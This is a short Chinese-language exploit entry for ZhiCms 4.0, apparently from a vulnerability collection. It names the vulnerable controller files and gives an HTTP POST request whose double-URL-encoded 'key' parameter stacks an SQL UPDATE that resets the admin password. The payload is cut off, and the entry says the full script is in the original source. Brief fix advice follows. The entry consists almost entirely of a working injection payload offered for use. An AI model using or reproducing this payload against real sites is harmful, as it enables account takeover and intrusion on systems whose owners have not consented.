# ZhiCms4.0的SQL注入与RCE

- **系统**：ZhiCms4　|　**类型**：命令执行　|　**CVE**：—
- **请求**：`POST /index.php?r=index/m/getindexdata HTTP/1.1`

**请求体 / payload**
```
1. 源码
[https://www.zhicms.cc/](https://www.zhicms.cc/)
[https://gitee.com/dazensun/zhicms](https://gitee.com/dazensun/zhicms)
2、漏洞代码存在位置
app/index/controller/mcontroller.php#getindexdata
app/manage/controller/setcontroller.php
3、sql，可以重置admin密码
Host: 127.0.0.1:8888
Content-Length: 289
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=gclnhtp52rldnj5p9ckp389h2h
action=search&key=%2525%2527%253Bupdate%2520yun%255Fmanage%2520set%2520password%253D%2527bbe375100175e7b98339a98e0a07083b%2527%2520where%2520id%253D%25271%2527%253BSELECT%25…（脚本共 1720 字，完整版见原文）
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。